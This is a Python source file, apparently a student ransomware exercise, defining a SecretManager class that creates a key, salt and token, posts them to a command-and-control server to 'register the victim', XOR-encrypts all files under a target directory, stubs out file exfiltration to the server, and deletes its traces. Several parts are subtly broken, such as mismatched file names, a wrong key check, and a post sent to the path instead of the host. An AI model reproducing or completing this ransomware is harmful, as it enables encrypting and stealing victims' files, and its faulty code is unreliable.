from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes: # we use the PBKDF2HMAC to cryptograph the key and after derivate it
        kdf = PBKDF2HMAC(hashes.SHA256(),self.TOKEN_LENGTH,salt,self.ITERATION) #the parameters are the one already defined by the class
        derivate = kdf.derive(key)
        return derivate


    def create(self)->Tuple[bytes, bytes, bytes]: 
        key = secrets.token_bytes(self.KEY_LENGTH) #creation of key and salt
        salt = secrets.token_bytes(self.SALT_LENGTH)
        derivate_key = self.do_derivation(salt,key) # derivation of the key
        return key, salt, derivate_key


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        requests.post(self._path, json = {
        "token" : self.bin_to_b64(token),
        "salt" : self.bin_to_b64(salt),
        "key" : self.bin_to_b64(key)
        })

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        self._key, self._salt, self._token = self.create()
        with open(os.path.join(self._path,'token.bin'),'wb') as f:
            f.write(self._token)
        with open(os.path.join(self._path,'salt.bin'),'wb') as f:
            f.write(self._salt)
        self.post_new(self._salt,self._key,self._token)

    def load(self)->None:
        # function to load crypto data
        # Load salt and token
        with open('salt.txt', 'r') as f:
            self.salt = f.read().strip()
        with open('token.txt', 'r') as f:
            self.token = f.read().strip()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        # Hash the candidate key with the salt and compare to the stored key
        hashed_key = sha256(self.salt.encode() + candidate_key).digest()
        return self._key == hashed_key

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        # Decode the base64-encoded key
        decoded_key = base64.b64decode(b64_key)

        # Check if the key is valid
        if not self.check_key(decoded_key):
            raise ValueError("Invalid key")

        # Set the key
        self._key = decoded_key

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        hex = sha256(self.token).hexdigest()
        return hex

    def xorfiles(self, files:List[str])->None:
        from ransomware import get_files
        # xor a list for file
        files = get_files(self._path)
        for i in files:        
            xorfile(i,self._key)

    def leak_files(self,files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        os.remove('salt.txt')

        os.remove('token.txt')

        os.remove('key.txt')
